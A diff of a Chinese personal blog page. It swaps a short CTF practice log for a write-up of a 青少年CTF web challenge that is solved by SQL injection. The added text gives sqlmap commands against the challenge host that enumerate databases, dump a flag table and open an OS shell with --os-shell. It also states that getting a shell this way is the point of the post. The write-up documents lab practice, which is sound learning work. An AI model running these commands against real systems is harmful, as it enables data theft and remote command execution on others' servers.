@@ -16,24 +16,34 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta name="description" content="简介本文件用于记录每天刷题 2024-02-28 [NSSRound#8 Basic]MyDoor  https:&#x2F;&#x2F;www.nssctf.cn&#x2F;problem&#x2F;3483   [MoeCTF 2021]babyRCE  https:&#x2F;&#x2F;www.nssctf.cn&#x2F;problem&#x2F;3409">
+    <meta name="description" content="web文章管理系统这个是一个sql注入 0x00 使用的知识点 sql 注入 0x01   出现id 0x02 爆破数据库 1python sqlmap.py  -u  http:&#x2F;&#x2F;challenge.qsnctf.com:32112?id&#x3D;1 --dbs   发现ctftraining 1python sqlmap.py  -u  http:&#x2F;&#x2F;challenge.qsnctf.com:321">
 <meta property="og:type" content="article">
-<meta property="og:title" content="时间轴">
-<meta property="og:url" content="https://tsy244.github.io/2024/02/28/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E6%97%B6%E9%97%B4%E8%BD%B4/index.html">
+<meta property="og:title" content="青少年CTF">
+<meta property="og:url" content="https://tsy244.github.io/2024/02/29/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4CTF/index.html">
 <meta property="og:site_name" content="AU9U5T">
-<meta property="og:description" content="简介本文件用于记录每天刷题 2024-02-28 [NSSRound#8 Basic]MyDoor  https:&#x2F;&#x2F;www.nssctf.cn&#x2F;problem&#x2F;3483   [MoeCTF 2021]babyRCE  https:&#x2F;&#x2F;www.nssctf.cn&#x2F;problem&#x2F;3409">
+<meta property="og:description" content="web文章管理系统这个是一个sql注入 0x00 使用的知识点 sql 注入 0x01   出现id 0x02 爆破数据库 1python sqlmap.py  -u  http:&#x2F;&#x2F;challenge.qsnctf.com:32112?id&#x3D;1 --dbs   发现ctftraining 1python sqlmap.py  -u  http:&#x2F;&#x2F;challenge.qsnctf.com:321">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-02-28T13:12:07.000Z">
-<meta property="article:modified_time" content="2024-02-28T14:20:40.657Z">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229221646951.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229221714442.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229221930773.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229222237820.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229222308201.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229222411385.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229222425542.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229222448130.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229222500424.png">
+<meta property="article:published_time" content="2024-02-29T13:33:23.000Z">
+<meta property="article:modified_time" content="2024-02-29T14:26:08.967Z">
 <meta property="article:author" content="August Rosenberg">
-<meta property="article:tag" content="CTF刷题记录">
+<meta property="article:tag" content="CTF比赛记录">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229221646951.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>时间轴 - AU9U5T</title>
+  <title>青少年CTF - AU9U5T</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +209,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="时间轴"></span>
+            <span id="subtitle" data-typed-text="青少年CTF"></span>
           
         </div>
 
@@ -215,8 +225,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-02-28 21:12" pubdate>
-          February 28, 2024 pm
+        <time datetime="2024-02-29 21:33" pubdate>
+          February 29, 2024 pm
         </time>
       </span>
     
@@ -227,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          133 words
+          443 words
         
       </span>
     
@@ -238,7 +248,7 @@
         
         
         
-          2 mins
+          4 mins
         
       </span>
     
@@ -276,22 +286,43 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">时间轴</h1>
+            <h1 style="display: none">青少年CTF</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文件用于记录每天刷题</p>
-<h1 id="2024-02-28"><a href="#2024-02-28" class="headerlink" title="2024-02-28"></a>2024-02-28</h1><ol>
-<li><p>[NSSRound#8 Basic]MyDoor</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3483">https://www.nssctf.cn/problem/3483</a></p>
-</blockquote>
-</li>
-<li><p>[MoeCTF 2021]babyRCE</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3409">https://www.nssctf.cn/problem/3409</a></p>
-</blockquote>
+                <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="文章管理系统"><a href="#文章管理系统" class="headerlink" title="文章管理系统"></a>文章管理系统</h2><p>这个是一个sql注入</p>
+<p>0x00</p>
+<p>使用的知识点</p>
+<p>sql 注入</p>
+<p>0x01</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229221646951.png" srcset="/img/loading.gif" lazyload alt="image-20240229221646951"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229221714442.png" srcset="/img/loading.gif" lazyload alt="image-20240229221714442"></p>
+<p>出现id</p>
+<p>0x02</p>
+<p>爆破数据库</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span>  -<span class="hljs-keyword">u</span>  http://challenge.qsnctf.<span class="hljs-keyword">com</span>:<span class="hljs-number">32112</span>?id=<span class="hljs-number">1</span> --dbs<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229221930773.png" srcset="/img/loading.gif" lazyload alt="image-20240229221930773"></p>
+<p>发现ctftraining</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span>  -<span class="hljs-keyword">u</span>  http://challenge.qsnctf.<span class="hljs-keyword">com</span>:<span class="hljs-number">32112</span>?id=<span class="hljs-number">1</span> -D --tables<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229222237820.png" srcset="/img/loading.gif" lazyload alt="image-20240229222237820"></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python sqlmap.py  -u  http:<span class="hljs-string">//challenge.qsnctf.com</span><span class="hljs-function">:32112</span>?id=1 -D ctftraining -T FLAG_TABLE <span class="hljs-params">--COLUMNS</span> <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229222308201.png" srcset="/img/loading.gif" lazyload alt="image-20240229222308201"></p>
+<p>啥也没有</p>
+<p>翻遍了整个库都没有发现</p>
+<p>尝试连接webshell</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span>  -<span class="hljs-keyword">u</span>  http://challenge.qsnctf.<span class="hljs-keyword">com</span>:<span class="hljs-number">32112</span>?id=<span class="hljs-number">1</span> --os-<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229222411385.png" srcset="/img/loading.gif" lazyload alt="image-20240229222411385"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229222425542.png" srcset="/img/loading.gif" lazyload alt="image-20240229222425542"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229222448130.png" srcset="/img/loading.gif" lazyload alt="image-20240229222448130"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4ctf/image-20240229222500424.png" srcset="/img/loading.gif" lazyload alt="image-20240229222500424"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li><p>web 的所有题都做了，但是剩下的三道比较简单，所以没有记录</p>
+<p>记录这个主要是使用sqlmap 连接shell 的方式</p>
 </li>
 </ol>
 
@@ -306,7 +337,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">#CTF刷题记录</a>
+        <a href="/tags/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/">#CTF比赛记录</a>
       
     </div>
   
@@ -318,8 +349,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>时间轴</div>
-      <div>https://tsy244.github.io/2024/02/28/CTF刷题记录/WEB/时间轴/</div>
+      <div>青少年CTF</div>
+      <div>https://tsy244.github.io/2024/02/29/CTF比赛记录/青少年CTF/</div>
     </div>
     <div class="license-meta">
       
@@ -331,7 +362,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>February 28, 2024</div>
+          <div>February 29, 2024</div>
         </div>
       
       
@@ -363,18 +394,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/02/29/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E9%9D%92%E5%B0%91%E5%B9%B4CTF/" title="青少年CTF">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">青少年CTF</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/02/28/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun07/" title="RedSun07">
-                        <span class="hidden-mobile">RedSun07</span>
+                      <a href="/2024/02/28/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E6%97%B6%E9%97%B4%E8%BD%B4/" title="时间轴">
+                        <span class="hidden-mobile">时间轴</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
